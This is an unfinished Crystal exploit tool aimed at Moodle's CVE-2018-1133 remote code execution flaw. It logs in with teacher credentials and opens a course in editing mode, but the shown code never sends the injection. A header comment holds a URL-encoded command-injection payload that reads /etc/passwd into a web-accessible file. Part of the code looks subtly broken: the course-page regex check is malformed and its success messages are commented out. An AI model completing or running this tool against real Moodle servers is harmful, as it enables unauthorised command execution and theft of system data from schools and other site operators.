# TODO: Write documentation for `Toodlemoodle`
# CVE-2018-1133 link: https://www.exploit-db.com/exploits/46551
# NVD vuln page: https://nvd.nist.gov/vuln/detail/CVE-2018-1133
# Security researcher page: https://blog.ripstech.com/2018/moodle-remote-code-execution/
# Docker image: https://hub.docker.com/r/jhardison/moodle/dockerfile
# Payload (date%3Bcat%20%2Fetc%2Fpasswd)%3E..%2Fhi.txt

require "http/client"
require "option_parser"
require "json"
require "base64"
require "./*"

module TMoodleActions
  class RCEExploit
    @@session = {"moodle_session" => "", "session_key" => ""}

    def perform(target)
      puts "[*] Welcome to the Moodle RCE tool!"
      puts "[?] Enter the teacher username"
      username = gets().not_nil!
      puts "[?] Enter the teacher password"
      psw = gets().not_nil!
      sess_info = SessionInfo.new
      @@session = sess_info.get_session(target, username, psw)
      puts "[?] Enter the course ID"
      course_id = gets().not_nil!
      load_course(target, course_id)
    end

    def load_course(url, id)
      puts "[>] Opening the course page..."
      result = http_get(url + "/course/view.php?id=" + id + "&sesskey=" + @@session["session_key"] + "&edit=on", @@session["moodle_session"])
      puts result.body.match("/.view.php\?id=2&notifyeditingon=1/").try &.[1]
      # if result.body.match("/.view.php\?id=2&notifyeditingon=1/").try &.[1]
      #   puts "[!] Course page loaded!"
      # else
      #   puts "[!] Failed loading course!"
      # end
    end

    private def http_post(url, data : String | Hash(String, String | Int32), moodle_session = "", json = nil)
      headers = HTTP::Headers.new
      if moodle_session != ""
        headers.add("Cookie", "MoodleSession=" + moodle_session)
      end
      if json
        headers.add("Content-Type", "application/json")
      end

      return HTTP::Client.post(url, headers: headers, form: data)
    end

    private def http_get(url, moodle_session)
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + moodle_session.to_s)
      return HTTP::Client.get(url, headers: headers)
    end
  end
end
